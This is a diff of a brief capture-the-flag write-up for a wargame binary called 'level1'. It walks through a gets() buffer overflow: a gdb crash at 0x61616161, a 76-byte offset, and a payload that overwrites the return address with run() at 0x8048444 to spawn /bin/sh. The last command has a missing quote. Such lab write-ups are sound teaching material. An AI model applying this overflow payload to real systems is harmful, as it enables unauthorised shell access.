@@ -1,35 +1,19 @@
-the program seem's to only wait for input from stdin and exit
+The program wait for input and exit
 
-gdb level1
+As by the source code, it call gets with buffer of 64 bytes
 
-disas main
-
-we can gather more informations with info functions
-
-we can see an function 'run()' right before our main()
-
-disas main
-disas run
-
-run call fwrite then system "/bin/sh"
-
-Since this is using gets we can overflow
+There is also a function which call system.
+With an overflow we can redirect EIP to call this function
 
 gdb> run < <(python -c "print 'a' * 80")
 
 Program received signal SIGSEGV, Segmentation fault.
 0x61616161 in ?? ()
 
-we got a nice segfault since we're trying to access address 0x61*** which is an invalid addr
+We're overwriting EIP, pass it an address at the good offset
 
-that's nice it mean we overwriting return address (eip) so we can go where we want
-
-p run give us the adress of run function
-0x8048444
-
-./level1 < <(python -c 'print "a" * 76 + "\x44\x84\x04\x08"')
-
-we need to keep stdin open
+(gdb) p run
+$1 = {<text variable, no debug info>} 0x8048444 <run>
 
 cat <(python -c 'print "a" * 76 + \x44\x84\x04\x08"') - | ./level1
 
